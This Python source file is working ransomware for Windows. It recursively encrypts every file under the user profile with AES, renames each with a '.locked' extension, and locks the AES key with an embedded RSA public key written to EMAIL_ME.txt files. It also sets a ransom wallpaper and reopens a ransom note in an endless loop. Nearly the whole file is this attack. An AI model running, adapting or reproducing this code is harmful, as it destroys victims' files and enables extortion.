import os
import binascii
import ctypes
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto import Random

ext = 'locked'

PUBLIC_RSA_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAhRwa1M2VM1Evs2/DutWe
J4HA+KnFyLg9If+8YU122yJM+R/PVAaHMK/+PyhQpTtdFElJfTeP64Fti022j1rz
povLyd4OyRLYVniQ2ENHhfzFibjNBnPqegBrbtd3g5jNZwjQ9+HsTz6lHb5tLv7i
ZuUmLTJ8IQw5eNzSkL2LFqkBAvJlaJUg8zBP5ba5odQA053za9oH2nkICPUfJeBK
uDS/7/QJiLFxpWsRwglimPA5Ffu1hwqd7tlPuDYj8IN+fozuYsRGOxqlUD8aLq9O
TiX0r4LmoVxxW3aKySCrtaoqzfuzrtZ336f5X2tATmWKBkm33gbCYUEeAyXAYfvg
PwIDAQAB
-----END PUBLIC KEY-----
'''

path = os.environ['USERPROFILE']
lst = os.walk(path)
files = []
for i in lst:
    local_dir = i[0]
    for j in i[2]:
        if j not in ['ranwallpaper.jpg', 'ransomenote.txt', 'decryptor.exe']:
            str = f'{local_dir}\\{j}'
            files.append(str)


def encrypt(key, files, IV):
    cipher = AES.new(key, AES.MODE_CBC, IV)
    for file in files:
        try:
            with open(file, 'rb') as f:
                data = f.read()
                if len(data) % 16 != 0:
                    data += (16 - (len(data) % 16)) * b'0'
            with open(file, 'wb+') as f:
                encrypted_data = cipher.encrypt(data)
                f.write(encrypted_data)
            os.rename(file, f'{file}.{ext}')
            # print(f'{file} encrypted')
        except:
            pass
            # print(f'{file} not encrypted')


key = SHA256.new(Random.new().read(2048)).digest()
IV = b'This is an IV456'

encrypt(key, files, IV)

public_key = RSA.import_key(PUBLIC_RSA_KEY)
rsa_encryptor = PKCS1_OAEP.new(public_key)
encrypted_key = rsa_encryptor.encrypt(binascii.hexlify(key))

email_dir = ['Desktop', 'Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
for i in email_dir:
    with open(f'{os.environ["USERPROFILE"]}//{i}//EMAIL_ME.txt', 'wb') as f:
        f.write(encrypted_key)

ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}//ranwallpaper.jpg', 0)

cmd_notepad = 'notepad.exe ransomenote.txt'
while True:
    os.system(cmd_notepad)
